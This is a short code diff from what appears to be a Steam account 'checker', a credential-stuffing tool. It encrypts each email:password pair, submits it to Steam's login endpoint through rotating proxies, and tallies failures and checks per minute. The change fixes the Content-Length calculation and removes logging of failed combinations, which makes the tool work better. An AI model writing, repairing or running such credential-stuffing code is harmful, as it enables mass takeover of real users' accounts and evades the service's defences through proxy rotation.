@@ -63,7 +63,7 @@ def check(email:str,password:str):
             t_2 = keys["timestamp"]
             
             encrypted_password = quote(b64encode(encrypt(password.encode(),PublicKey(int(k1,16), int(k2,16)))))
-            length_2 = data_2.format(t_1,encrypted_password,username,t_2)
+            length_2 = len(data_2.format(t_1,encrypted_password,username,t_2))
             header_2["Content-Length"] = str(length_2)
 
             response = post("https://store.steampowered.com/login/dologin/",data=data_2.format(t_1,encrypted_password,username,t_2),headers=header_2,proxies=proxy_set,timeout=Checker.timeout)
@@ -97,8 +97,6 @@ def check(email:str,password:str):
         except:
             bad_proxy(proxy)
             Checker.errors += 1
-    if not Checker.cui:
-        log("bad",email+":"+password,"Steam")
     Checker.bad += 1
     Checker.cpm += 1
     return
